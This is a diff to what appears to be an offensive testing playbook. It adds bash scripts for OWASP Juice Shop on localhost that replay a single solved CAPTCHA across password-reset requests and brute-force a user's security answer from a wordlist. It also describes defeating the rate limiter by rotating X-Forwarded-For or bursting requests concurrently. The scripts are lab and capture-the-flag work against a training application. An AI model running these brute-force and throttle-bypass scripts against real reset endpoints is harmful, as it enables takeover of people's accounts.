@@ -108,6 +108,64 @@ done
 # Report the math; do NOT actually exhaust 10^6 against a third party.
 ```
 
+#### Phase 2c — CAPTCHA single-use / answer-replay probe (Juice Shop)
+
+OWASP Juice Shop (SQLite backend; base URL `http://localhost:3000`) gates the
+password-reset flow behind a math CAPTCHA, but the server never marks a solved
+`captchaId` as consumed. You fetch ONE challenge, solve it ONCE, then replay the
+same `captchaId` + `answer` pair across an unlimited number of `/rest/user/reset-password`
+POSTs — the CAPTCHA stops being a rate-limit at all. This is the **CAPTCHA Bypass**
+challenge, and it is the enabler for the brute described in 2d.
+
+```bash
+TARGET="localhost:3000"
+# 1) Pull ONE captcha; capture its id and the arithmetic to solve.
+CAP=$(curl -s "http://$TARGET/rest/captcha/")
+echo "$CAP"     # -> {"captchaId":7,"captcha":"6*1*5","answer":"30"} (answer field present in this build)
+CID=$(echo "$CAP"  | python3 -c "import sys,json;print(json.load(sys.stdin)['captchaId'])")
+ANS=$(echo "$CAP"  | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('answer') or eval(d['captcha']))")
+
+# 2) Replay the SAME captchaId+answer across N reset POSTs. If every one is accepted
+#    (no 'wrong/expired captcha' and no new-id requirement), the CAPTCHA is single-use-broken.
+for i in $(seq 1 20); do
+  curl -s -o /dev/null -w "replay $i -> %{http_code}\n" \
+    -X POST "http://$TARGET/rest/user/reset-password" \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"jim@juice-sh.op\",\"answer\":\"wrong-security-answer-$i\",\"new\":\"Pass123!\",\"repeat\":\"Pass123!\",\"captcha\":\"$ANS\",\"captchaId\":$CID}"
+done
+# 20 accepted POSTs from ONE solved captcha = CAPTCHA Bypass confirmed. Unlocks: **CAPTCHA Bypass**.
+```
+
+#### Phase 2d — chain: reset-answer brute under a replayed CAPTCHA (Reset Morty's Password)
+
+With 2c neutralising the CAPTCHA, the security-question answer becomes the only
+gate on Juice Shop's reset endpoint — and Juice Shop's Angular client enforces
+form rules client-side only, so the server happily accepts raw `/rest/user/reset-password`
+POSTs. Morty's recovery answer is a low-entropy string (his pet's name), so brute it
+with a wordlist while replaying one solved `captchaId+answer`:
+
+```bash
+# Reuse $CID/$ANS from 2c (one solved captcha for the whole run).
+while read GUESS; do
+  RESP=$(curl -s -X POST "http://$TARGET/rest/user/reset-password" \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"morty@juice-sh.op\",\"answer\":\"$GUESS\",\"new\":\"NewPass123!\",\"repeat\":\"NewPass123!\",\"captcha\":\"$ANS\",\"captchaId\":$CID}" \
+    -o /dev/null -w "%{http_code}")
+  echo "$GUESS -> $RESP"
+  [ "$RESP" = "200" ] && { echo "RESET OK with answer: $GUESS"; break; }
+done < ~/wordlists/pet-names.txt
+# A 200 = password reset succeeded → ATO. Unlocks: **Reset Morty's Password** (chains CAPTCHA Bypass).
+```
+
+> Chain note → **hunt-race-condition**: Juice Shop *does* attach an exponential
+> rate-limiter to `/rest/user/reset-password` (express-rate-limit, keyed on the
+> `X-Forwarded-For` header). When the answer brute in 2d starts hitting `429`,
+> hand off to **hunt-race-condition** / the Phase 4 IP-rotation bypass below:
+> rotate `X-Forwarded-For` per request to reset the per-key counter, OR fire the
+> guesses concurrently to slip a burst through before the limiter window closes.
+> The replayed CAPTCHA (2c) + per-`XFF` counter reset is the same defeat-the-soft-throttle
+> pattern as the Instagram-2019 reset-code class in the Crown Jewel Targets list.
+
 ### Phase 3 — Username / Email Enumeration (string AND status AND timing)
 ```bash
 VALID_USER="known-user@$TARGET"
@@ -235,6 +293,7 @@ nuclei -u "https://$TARGET" -t http/fuzzing/ -t http/default-logins/ -severity m
 |---------|----------|--------|
 | No effective rate limit on OTP (full 10^6 reachable) | MFA bypass → ATO | Critical |
 | Password-reset code brute + IP rotation | Reset → ATO (Instagram-2019 class) | Critical |
+| CAPTCHA single-use/replay (Juice Shop) → reset-answer brute | One solved captchaId replayed → answer brute → reset Morty's password (ATO) | High–Critical |
 | No rate limit on login + enumeration | Credential stuffing with breach corpus | High |
 | IP bypass via X-Forwarded-For et al. | Every per-IP limit on the app defeated | High |
 | Predictable / low-entropy reset token | Token guess within validity window → ATO | High |
